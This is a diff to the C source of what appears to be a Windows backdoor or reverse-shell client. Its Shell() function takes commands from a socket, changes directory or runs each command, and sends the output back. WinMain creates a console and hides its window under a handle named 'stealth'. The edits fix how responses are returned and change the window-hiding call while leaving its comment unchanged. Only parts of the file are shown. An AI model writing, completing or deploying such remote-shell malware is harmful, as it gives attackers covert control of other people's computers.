@@ -1,4 +1,4 @@
-directories#include <stdio.h>
+#include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
 #include <winsock2.h>
@@ -32,6 +32,7 @@ void Shell() {
         } else if (strncmp("cd ", buffer, 3) == 0) {
             char *temp = buffer + 3;
             chdir(temp); //changes program dir
+            strcat(totalResponse, temp);
         } else {
             //execute command
             FILE *file; //file is basically just used as a string stream
@@ -43,9 +44,9 @@ void Shell() {
                 //TODO: Try swapping the while with fgets to total response
                 strcat(totalResponse, container);
             }
-            send(sock, totalResponse, sizeof(totalResponse), 0);
             fclose(file);
         }
+        send(sock, totalResponse, sizeof(totalResponse), 0);
     }
     
     //exit program
@@ -58,7 +59,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
     HWND stealth; //window handle
     AllocConsole(); //creates a console
     stealth = FindWindowA("ConsoleWindowClass", NULL); //retrives handle to top level window
-    ShowWindow(stealth, 0); //0 is basically hiding the window
+    ShowWindow(stealth, 3); //0 is basically hiding the window
 
     struct sockaddr_in ServAddr;
     unsigned short ServPort;
